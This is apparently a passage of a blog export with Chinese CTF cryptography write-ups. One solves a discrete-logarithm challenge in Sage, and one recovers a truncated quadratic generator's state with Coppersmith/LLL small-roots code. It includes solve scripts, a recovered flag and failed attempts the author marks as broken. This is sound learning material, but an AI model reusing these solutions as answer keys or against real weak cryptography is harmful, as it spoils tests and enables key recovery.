    <content><![CDATA[<p>尚师傅推荐的题目，着实没有想到被他反将了一军</p>
<span id="more"></span>

<h1 id="【胖哈勃的七月公开赛】密码要先学好数学"><a href="#【胖哈勃的七月公开赛】密码要先学好数学" class="headerlink" title="【胖哈勃的七月公开赛】密码要先学好数学"></a>【胖哈勃的七月公开赛】密码要先学好数学</h1><p>那完了</p>
<h2 id="MathCrypto"><a href="#MathCrypto" class="headerlink" title="MathCrypto"></a>MathCrypto</h2><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line">a = <span class="number">288260533169915</span></span><br><span class="line">p = <span class="number">1007621497415251</span></span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">b&#x27;flag&#123;********************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_flag</span>(<span class="params">flag</span>):</span></span><br><span class="line">    ciphertext = []</span><br><span class="line">    plaintext = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> flag])</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> plaintext:</span><br><span class="line">        e = randint(<span class="number">1</span>, p)</span><br><span class="line">        n = <span class="built_in">pow</span>(a, e, p)</span><br><span class="line">        <span class="keyword">if</span> b == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            ciphertext.append(n)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            n = -n % p</span><br><span class="line">            ciphertext.append(n)</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(encrypt_flag(FLAG))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>核心的算法就是<br>$$<br>n_i=a^{e_i}mod\ p<br>$$<br>已知p是素数，e是p的完全剩余系中的某一个元素，也就是[1, p]中的一个随机数，通过n来求这一位是1还是0</p>
<p><em>可恶都是做MT的缘故，现在一看到这种随机数总想着看文件的修改时间，但一般没有明示考伪随机的题目还是不要异想天开了</em></p>
<p>我所想到的思路有，一是费马小定理，因为p是素数所以满足<br>$$<br>a^{p-1}\equiv 1\ mod\ p<br>$$<br>不过也不知道怎么继续了；二是中国剩余定理，够构造一些列的同余式<br>$$<br>\begin{cases}<br>a\equiv n_1^{d_1}\ mod\ p\\<br>a\equiv n_2^{d_2}\ mod\ p\\<br>\quad \vdots\\<br>a\equiv n_i^{d_i}\ mod\ p<br>\end{cases}<br>$$<br>但苦于d没有办法爆破得到。显然这题考的不是这两者</p>
<blockquote>
<p>解题脚本</p>
</blockquote>
<p>不得不说尚师傅的思路还是很犀利的，一看到discrete_log我就暗叫不妙，思绪瞬间涌上心头</p>
<p>暑假开始集训的第一天，我佯装给他们一道题，是来自【2020网鼎杯 青龙组 You raise me up】改编，当时只是觉得discrete_log可以如yafu一样解出离散对数，很神奇。但是背后的原理没有深究，只知道n是$2^{512}$，在这个群上求离散对数不是困难的</p>
<p>而这道题p是素数，按道理应该是困难的呢，但是我们有SageMath</p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706094104620.png" alt="image-20210706094104620" style="zoom:67%;" />

<p>遇事不决</p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706100646660.png" alt="image-20210706100646660" style="zoom:50%;" />

<p>简单试验了几个</p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706105137154.png" alt="image-20210706105137154" style="zoom:67%;" />

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706105205534.png" alt="image-20210706105205534"></p>
<p>如果找不到离散对数就会报错，可以用异常处理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 为了使用Python2的print不换行</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line">a = <span class="number">288260533169915</span></span><br><span class="line">p = <span class="number">1007621497415251</span></span><br><span class="line">n = [<span class="number">835573322319412</span>, <span class="number">194156231145433</span>, <span class="number">459240835091427</span>, <span class="number">254691265527581</span>, <span class="number">452163501868176</span>, <span class="number">362769806018159</span>, <span class="number">390335330574588</span>, <span class="number">795683531947695</span>, <span class="number">547245847322642</span>, <span class="number">662157248109028</span>, <span class="number">973966064208336</span>, <span class="number">252129990307548</span>, <span class="number">578699863722488</span>, <span class="number">486222427902568</span>, <span class="number">117477413047771</span>, <span class="number">740421014593358</span>, <span class="number">863241886290392</span>, <span class="number">222275563655891</span>, <span class="number">293327716717603</span>, <span class="number">708319736688481</span>, <span class="number">889074509131674</span>, <span class="number">417808854196549</span>, <span class="number">131645986814206</span>, <span class="number">249411728529916</span>, <span class="number">500308738571101</span>, <span class="number">178419560186091</span>, <span class="number">441524245815824</span>, <span class="number">270385977926445</span>, <span class="number">134464725515031</span>, <span class="number">34977330760372</span>, <span class="number">789037598270288</span>, <span class="number">871556001954572</span>, <span class="number">42895524249924</span>, <span class="number">602041422192220</span>, <span class="number">45250560584859</span>, <span class="number">836594396205340</span>, <span class="number">154261010116600</span>, <span class="number">906631913900110</span>, <span class="number">73716306230031</span>, <span class="number">57491432561272</span>, <span class="number">937546091143710</span>, <span class="number">573584711515529</span>, <span class="number">117838942375694</span>, <span class="number">108224759885936</span>, <span class="number">686520256664437</span>, <span class="number">328396509053949</span>, <span class="number">964793767786949</span>, <span class="number">952055129356587</span>, <span class="number">570054348386776</span>, <span class="number">132721379375751</span>, <span class="number">421580578207025</span>, <span class="number">302791761439275</span>, <span class="number">558510385173476</span>, <span class="number">7941240282405</span>, <span class="number">10928401173457</span>, <span class="number">382447756114972</span>, <span class="number">169542347967514</span>, <span class="number">977453208629407</span>, <span class="number">460734109220968</span>, <span class="number">573505124794720</span>, <span class="number">318306022981107</span>, <span class="number">120648106475963</span>, <span class="number">807138639422627</span>, <span class="number">996507910024607</span>, <span class="number">102816788391640</span>, <span class="number">660745079166409</span>, <span class="number">809890775939749</span>, <span class="number">832519292688500</span>, <span class="number">87538065186141</span>, <span class="number">637100151940331</span>, <span class="number">382113003094066</span>, <span class="number">470655145986067</span>, <span class="number">644778242358267</span>, <span class="number">517586163010705</span>, <span class="number">558938708706131</span>, <span class="number">150978345005135</span>, <span class="number">102930326517355</span>, <span class="number">782154305431595</span>, <span class="number">6219189599369</span>, <span class="number">243324433725873</span>, <span class="number">650527665111501</span>, <span class="number">100280527101388</span>, <span class="number">1005535261333789</span>, <span class="number">987714102930385</span>, <span class="number">1002475950204796</span>, <span class="number">922079478085088</span>, <span class="number">906834270364060</span>, <span class="number">53211341275436</span>, <span class="number">965041750990423</span>, <span class="number">77115141669784</span>, <span class="number">588069693290238</span>, <span class="number">794822251044102</span>, <span class="number">930830807276545</span>, <span class="number">201161070608812</span>, <span class="number">568151623857765</span>, <span class="number">678968180937073</span>, <span class="number">412380912864953</span>, <span class="number">162493098979490</span>, <span class="number">631342883381540</span>, <span class="number">261680062360627</span>, <span class="number">227532833267531</span>, <span class="number">251016357185685</span>, <span class="number">827419020607751</span>, <span class="number">858376422971452</span>, <span class="number">362277983384639</span>, <span class="number">527363637534876</span>, <span class="number">334777651780889</span>, <span class="number">210527722411428</span>, <span class="number">808789791291861</span>, <span class="number">520556222865899</span>, <span class="number">704810558642854</span>, <span class="number">568037991932850</span>, <span class="number">169208358508287</span>, <span class="number">413145308937205</span>, <span class="number">599769322994671</span>, <span class="number">441328336467023</span>, <span class="number">849181035363926</span>, <span class="number">83477340978714</span>, <span class="number">80594200850041</span>, <span class="number">660277475107773</span>, <span class="number">928502236651086</span>, <span class="number">790965510818429</span>, <span class="number">135278692982626</span>, <span class="number">424887158380721</span>, <span class="number">411620739036446</span>, <span class="number">135280586082276</span>, <span class="number">714308921541654</span>, <span class="number">9109479300877</span>, <span class="number">650573139284244</span>, <span class="number">870861989942716</span>, <span class="number">443255252246208</span>, <span class="number">70455275832571</span>, <span class="number">369440682873276</span>, <span class="number">515899628421991</span>, <span class="number">612793429865648</span>, <span class="number">723589985084253</span>, <span class="number">160660351599873</span>, <span class="number">846726628855115</span>, <span class="number">8027417644170</span>, <span class="number">922790558110918</span>, <span class="number">329372648478795</span>, <span class="number">363470140166698</span>, <span class="number">86704784885484</span>, <span class="number">854835234890991</span>, <span class="number">976023205217544</span>, <span class="number">652708649867132</span>, <span class="number">388967328647036</span>, <span class="number">559512066466403</span>, <span class="number">36971809912721</span>, <span class="number">335187129410393</span>, <span class="number">6855900757516</span>, <span class="number">543488958018354</span>, <span class="number">287382478990521</span>, <span class="number">439225225775323</span>, <span class="number">661397580381098</span>, <span class="number">773933897777421</span>, <span class="number">523567536261705</span>, <span class="number">390598723653906</span>, <span class="number">417048954790947</span>, <span class="number">637431635583415</span>, <span class="number">335090251298424</span>, <span class="number">206308145752203</span>, <span class="number">501544720775707</span>, <span class="number">614789886972475</span>, <span class="number">357742401606467</span>, <span class="number">289036983452171</span>, <span class="number">668519107118940</span>, <span class="number">92139870679256</span>, <span class="number">388797793877078</span>, <span class="number">372191799798178</span>, <span class="number">1004628632761505</span>, <span class="number">145521166059580</span>, <span class="number">576232295004932</span>, <span class="number">119635574132509</span>, <span class="number">216801862623375</span>, <span class="number">155870719957478</span>, <span class="number">28321309890983</span>, <span class="number">732905921144578</span>, <span class="number">791832670754979</span>, <span class="number">671433181708904</span>, <span class="number">435663032194545</span>, <span class="number">316031621753570</span>, <span class="number">220369837362135</span>, <span class="number">356539134058642</span>, <span class="number">360074630241799</span>, <span class="number">764194424366054</span>, <span class="number">46729635512483</span>, <span class="number">924976743846057</span>, <span class="number">646158916629764</span>, <span class="number">894838984085320</span>, <span class="number">757222585897598</span>, <span class="number">829482878889900</span>, <span class="number">838347423444759</span>, <span class="number">590218802707709</span>, <span class="number">793621010210316</span>, <span class="number">79947449693367</span>, <span class="number">739723478650329</span>, <span class="number">163281924014926</span>, <span class="number">808389762984067</span>, <span class="number">208262587169431</span>, <span class="number">582578916561821</span>, <span class="number">478856137518673</span>, <span class="number">650032839378814</span>, <span class="number">58022200409911</span>, <span class="number">17291737478946</span>, <span class="number">919921371618469</span>, <span class="number">473933973533026</span>, <span class="number">861870666818810</span>]</span><br><span class="line">a = mod(a, p)</span><br><span class="line">ni = [mod(_, p) <span class="keyword">for</span> _ <span class="keyword">in</span> n]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> ni:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        e = discrete_log(t, a)</span><br><span class="line">        flag += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        flag += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag = &#x27;0110011001101100011000010110011101111011010100000110000101110100011101000011001101110010011011100111001101011111001100010110111001011111011100100110010100110101011010010110010001110101001100110111001101111101&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag), <span class="number">8</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(flag[i:i+<span class="number">8</span>], <span class="number">2</span>)), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>跑的过程确实很慢，最后得到flag</p>
<blockquote>
<p>flag{Patt3rns_1n_re5idu3s}</p>
</blockquote>
<p>模式在剩余？</p>
<p>然后还有一点想不通的，如果discrete_log可以解出e，那按道理也可以解出d，但是虽然可以解出来，但是得到的答案并不对，不知道为什么</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706115202341.png" alt="image-20210706115202341"></p>
<p><strong>最后至于为什么能够解出来，反正暴力破解是出不来的，应该有一些求解离散对数的常用方法，在这研究也没什么必要，请继续吧</strong></p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>sage</tag>
      </tags>
  </entry>
  <entry>
    <title>20210710 CTFSHOW CJBCrypto方向部分WP</title>
    <url>/posts/78d3fdb3/</url>
    <content><![CDATA[<p>&nbsp;</p>
<span id="more"></span>

<h1 id="CJB"><a href="#CJB" class="headerlink" title="CJB"></a>CJB</h1><h2 id="Cop-Run"><a href="#Cop-Run" class="headerlink" title="Cop! Run!!"></a>Cop! Run!!</h2><p>la佬出的题目，这几天la佬的题可不是白刷的</p>
<blockquote>
<p>题目描述 </p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">n = <span class="number">1</span> &lt;&lt; <span class="number">8</span></span><br><span class="line">p = getPrime(n)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"></span><br><span class="line">P.&lt;t&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f = t * t + randrange(p)</span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"></span><br><span class="line">x = [randrange(p)]</span><br><span class="line">x += [f(x[<span class="number">0</span>])]</span><br><span class="line"><span class="built_in">print</span>([x_ &gt;&gt; (n - ceil(<span class="number">5</span> * n / <span class="number">7</span>)) <span class="keyword">for</span> x_ <span class="keyword">in</span> x])</span><br><span class="line"></span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line">y = f(x[-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    y = f(y)</span><br><span class="line">    flag ^^= <span class="built_in">int</span>(y)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">92946459607669937513774102250057295249718593723232674702212854287358873135783</span></span><br><span class="line"><span class="string">t^2 + 43844336985235863734419631630425915388298791521868754583032904718644333115590</span></span><br><span class="line"><span class="string">[3248642833056635029095920782095626337949113592116495266, 4883935221919623989344404485025479346028101682781790392]</span></span><br><span class="line"><span class="string">193207529097125793778662519051231322609402866155819915933598367395102313904490702547833</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>hint</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Brad Pitt &amp; Angelina Jolie love each other hard in some movie.</span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>题目中出现Cop，猜测是CopperSmith；从hint中获悉，一部零五年的电影《Mr Smith &amp; Mrs Smith》，是CopperSmith没跑了</p>
<p>先看代码，代码很简短，显然只要求出 x 的前两项，所有的问题就迎刃而解，或者说，只要知道 x[1] ，就可以求出 y ，然后依据异或的性质，加密即解密</p>
<p>而我们已知的是 x 右移73位的数据，显然是要求低位。自然而然可以想到方程的思想，设置几个变量，然后根据等式解方程。因为前面接触过 CopperSmith 在 RSA 中的应用，sage 里的 smal_roots 就是基于 CopperSmith 实现的</p>
<p>下面简单介绍一下 CopperSmith ，摘自CTF Wiki的介绍</p>
<hr>
<h2 id="CopperSmith基本原理-¶"><a href="#CopperSmith基本原理-¶" class="headerlink" title="CopperSmith基本原理 ¶"></a>CopperSmith基本原理 <a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_coppersmith_attack/#_1">¶</a></h2><p>Coppersmith 相关攻击与 <a href="https://en.wikipedia.org/wiki/Don_Coppersmith">Don Coppersmith</a> 紧密相关，他提出了一种针对于模多项式（单变量，二元变量，甚至多元变量）找所有小整数根的多项式时间的方法。</p>
<p>这里我们以单变量为主进行介绍，假设</p>
<ul>
<li>模数为 N ，N 具有一个因子$b≥N^β,0&lt;β≤1$</li>
<li>多项式 F 的次数为$δ$</li>
</ul>
<p>那么该方法可以在$O(cδ^5log^9(N))$的复杂度内找到该多项式所有的根$x_0$，这里我们要求 $|x_0|&lt;cN^\frac{β^2}{δ}$。</p>
<p>在这个问题中，我们的目标是找到在模 N 意义下多项式所有的根，这一问题被认为是复杂的。<strong>Coppersmith method</strong> 主要是通过 <a href="https://en.wikipedia.org/wiki/Lenstra%E2%80%93Lenstra%E2%80%93Lov%C3%A1sz_lattice_basis_reduction_algorithm">Lenstra–Lenstra–Lovász lattice basis reduction algorithm</a>（LLL）方法找到</p>
<ul>
<li>与该多项式具有相同根 $x_0$</li>
<li>更小系数</li>
<li>定义域为整数域</li>
</ul>
<p>的多项式 g，由于在整数域上找多项式的根是简单的（Berlekamp–Zassenhaus），从而我们就得到了原多项式在模意义下的整数根。</p>
<p>那么问题的关键就是如何将 f 转换到 g 呢？Howgrave-Graham 给出了一种思路</p>
<img data-src="https://ctf-wiki.org/crypto/asymmetric/rsa/figure/coppersmith-howgrave-graham.png" alt="image-20180717210921382"  />

<p>也就是说我们需要找到一个具有 “更小系数” 的多项式 g，也就是下面的转换方式</p>
<img data-src="https://ctf-wiki.org/crypto/asymmetric/rsa/figure/coppersmith-f2g.png" alt="image-20180717211351350">

<p>在 LLL 算法中，有两点是非常有用的</p>
<ul>
<li>只对原来的基向量进行整数线性变换，这可以使得我们在得到 g 时，仍然以原来的 $x_0$ 为根。</li>
<li>生成的新的基向量的模长是有界的，这可以使得我们利用 Howgrave-Graham 定理。</li>
</ul>
<p>在这样的基础之上，我们再构造出多项式族 g 就可以了。</p>
<p>关于更加细节的内容，请自行搜索。同时这部分内容也会不断更新。</p>
<p>需要注意的是，由于 Coppersmith 根的约束，在 RSA 中的应用时，往往只适用于 e 较小的情况。</p>
<hr>
<p>总结，CopperSmith 可以用来一元甚至多元的多项式</p>
<p>回到题目，初步尝试，在尚师傅的指导下，我写出来了第一个多项式，设 $x_{0}$ 的低73位为 k<br>$$<br>f(x_{0}&lt;&lt;73+k)&gt;&gt;73=x_{1}<br>$$<br>是关于 k 的一元多项式，然后我们尝试能不能解</p>
<p>la佬的博客上有解一元和多元的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="comment">#单元</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (a + x)^e - c</span><br><span class="line">root = f.small_roots(X=<span class="number">2</span>^<span class="number">256</span>, beta=<span class="number">1</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^256 with factor = n</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#多元</span></span><br><span class="line">load(<span class="string">&#x27;coppersmith.sage&#x27;</span>)</span><br><span class="line">P.&lt;x, y&gt; = PolynomialRing(GF(p))</span><br><span class="line">f = <span class="number">2</span>^<span class="number">170</span> * a^<span class="number">2</span> + <span class="number">2</span>^<span class="number">86</span> * a * x + x^<span class="number">2</span> - <span class="number">2</span>^<span class="number">85</span> * b + c - y</span><br><span class="line">roots = coron(f, X=<span class="number">2</span>^<span class="number">85</span>, Y=<span class="number">2</span>^<span class="number">85</span>, k=<span class="number">1</span>, debug=<span class="literal">True</span>)[<span class="number">0</span>]</span><br><span class="line">x, y = roots</span><br></pre></td></tr></table></figure>

<p>改了一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">92946459607669937513774102250057295249718593723232674702212854287358873135783</span></span><br><span class="line">Fp = Zmod(p)</span><br><span class="line">pi = <span class="number">43844336985235863734419631630425915388298791521868754583032904718644333115590</span></span><br><span class="line">x_ = [<span class="number">3248642833056635029095920782095626337949113592116495266</span>, <span class="number">4883935221919623989344404485025479346028101682781790392</span>]</span><br><span class="line"></span><br><span class="line">P.&lt;t&gt; = PolynomialRing(Fp)</span><br><span class="line">f = t * t + pi</span><br><span class="line"></span><br><span class="line">PR.&lt;k&gt; = PolynomialRing(Fp)</span><br><span class="line">s = f(x_[<span class="number">0</span>]*<span class="number">2</span>^<span class="number">73</span> + k)//<span class="number">2</span>*<span class="number">73</span>-x_[<span class="number">1</span>]</span><br><span class="line">root = s.small_roots(X=<span class="number">2</span>^<span class="number">73</span>, beta=<span class="number">1</span>)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<p>emmmmm 有几个问题，首先这样向右位移不知道中不中，然后总是报越界的错</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210711134025217.png" alt="image-20210711134025217"></p>
<p>在尝试以及一些等效替代无果后，我想到再添加一个变量；一是因为这样表示更加清晰，省去了向右位移的不确定性，二是la佬的博客里，也有求解多元多项式的脚本</p>
<p><em>解决不了就加一层，这是我从计网学来的</em></p>
<p>设 x[0] x[1] 的低73位为 k0 和 k1，写出来的等式是<br>$$<br>f(x_{0}&lt;&lt;73+k_0)=x_{1}&lt;&lt;73+k_1<br>$$<br>完成脚本的篡改，这个 coppersmith.sage 来自<a href="https://github.com/mimoo/RSA-and-LLL-attacks">https://github.com/mimoo/RSA-and-LLL-attacks</a>，也是从la佬博客里看到的；la佬yyds</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">load(<span class="string">&quot;coppersmith.sage&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="number">92946459607669937513774102250057295249718593723232674702212854287358873135783</span></span><br><span class="line">Fp = Zmod(p)</span><br><span class="line">pi = <span class="number">43844336985235863734419631630425915388298791521868754583032904718644333115590</span></span><br><span class="line">x_ = [<span class="number">3248642833056635029095920782095626337949113592116495266</span>, <span class="number">4883935221919623989344404485025479346028101682781790392</span>]</span><br><span class="line">c = <span class="number">193207529097125793778662519051231322609402866155819915933598367395102313904490702547833</span></span><br><span class="line"></span><br><span class="line">PR.&lt;t&gt; = PolynomialRing(Fp)</span><br><span class="line">f = t * t + pi</span><br><span class="line"></span><br><span class="line">PR.&lt;k0, k1&gt; = PolynomialRing(Fp)</span><br><span class="line">s = f(x_[<span class="number">0</span>]*<span class="number">2</span>^<span class="number">73</span> + k0)-x_[<span class="number">1</span>]*<span class="number">2</span>^<span class="number">73</span>-k1</span><br><span class="line">roots = coron(f, X=<span class="number">2</span>^<span class="number">85</span>, Y=<span class="number">2</span>^<span class="number">85</span>, k=<span class="number">1</span>, debug=<span class="literal">True</span>)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<p>emmmmm conron没有定义，看了下 github 里的源码， 确实没有找到这个函数；然后对这个构造多项式是否可解也不是很确定，就做不下去了</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210711144022632.png" alt="image-20210711144022632"></p>
<p>这份 github 里的有一个这个函数，但是感觉是用在 RSA 类型的题目上的</p>
<p>早上起来，抱着试一试的心态，又重新研究起这道题目；就是无止境的搜索吧，信息搜集的能力还是要向尚师傅学习</p>
<p>然后找到了原题</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/56JSZRFN%7BE%60PAZORN_E%7D_PM.gif" alt="img"></p>
<p>是三个月前 zer0pts CTF 的题目，看来这就是多刷题的意义。当时顺腾摸瓜，找到了 Joseph 师傅的博客，这位师傅是神人啊，之前好多东西都从他这里找到，TQQQQQL</p>
<p>然后当时就是改了他的脚本做出来的，除了一些推导（开始觉得哦原来如此，但后面发现就是把我的给展开了），当然最主要的，他提供了一个 coppersmith 求小根函数的 github 链接</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span></span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">		d = f.degree()</span><br><span class="line"></span><br><span class="line">	R = f.base_ring()</span><br><span class="line">	N = R.cardinality()</span><br><span class="line"></span><br><span class="line">	f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">	f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">	G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m+<span class="number">1</span>):</span><br><span class="line">		base = N^(m-i) * f^i</span><br><span class="line">		<span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">			g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">			G.append(g)</span><br><span class="line"></span><br><span class="line">	B, monomials = G.coefficient_matrix()</span><br><span class="line">	monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">	factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">	<span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">		B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">	B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">	B = B.change_ring(QQ)</span><br><span class="line">	<span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">		B.rescale_col(i, <span class="number">1</span>/factor)</span><br><span class="line"></span><br><span class="line">	H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">	<span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B*monomials):</span><br><span class="line">		H.append(h)</span><br><span class="line">		I = H.ideal()</span><br><span class="line">		<span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">			H.pop()</span><br><span class="line">		<span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">			roots = []</span><br><span class="line">			<span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">				root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">				roots.append(root)</span><br><span class="line">			<span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> []</span><br></pre></td></tr></table></figure>

<p>稍微改一下脚本就出来了，很快啊</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">load(<span class="string">&#x27;coppersmith.sage&#x27;</span>)</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">p = <span class="number">92946459607669937513774102250057295249718593723232674702212854287358873135783</span></span><br><span class="line">Fp = Zmod(p)</span><br><span class="line">b = <span class="number">43844336985235863734419631630425915388298791521868754583032904718644333115590</span></span><br><span class="line">c = <span class="number">193207529097125793778662519051231322609402866155819915933598367395102313904490702547833</span></span><br><span class="line">w0 = <span class="number">3248642833056635029095920782095626337949113592116495266</span></span><br><span class="line">w1 = <span class="number">4883935221919623989344404485025479346028101682781790392</span></span><br><span class="line"></span><br><span class="line">b,w0,w1 = <span class="built_in">map</span>(Fp, [b,w0,w1])</span><br><span class="line">PR.&lt;k0, k1&gt; = PolynomialRing(Fp)</span><br><span class="line"></span><br><span class="line">f = <span class="number">2</span>^<span class="number">146</span> * w0^<span class="number">2</span> + <span class="number">2</span>^<span class="number">74</span> * w0 * k0 + k0^<span class="number">2</span> - <span class="number">2</span>^<span class="number">73</span> * w1 + b - k1</span><br><span class="line">roots = small_roots(f, (<span class="number">2</span>^<span class="number">73</span>, <span class="number">2</span>^<span class="number">73</span>), m=<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">k0, k1 = roots</span><br><span class="line"></span><br><span class="line">v0 = <span class="number">2</span>^<span class="number">73</span> * w0 + k0</span><br><span class="line">v1 = <span class="number">2</span>^<span class="number">73</span> * w1 + k1</span><br><span class="line"></span><br><span class="line">PR.&lt;v&gt; = PolynomialRing(Fp)</span><br><span class="line">f = v^<span class="number">2</span> + b</span><br><span class="line">y = f(v1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    y = f(y)</span><br><span class="line">    c ^^= <span class="built_in">int</span>(y)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(c))</span><br></pre></td></tr></table></figure>

<p>当我整理WP的时候，将这个函数用到我昨天的等式上，发现也出来了，再贴一下完整脚本</p>
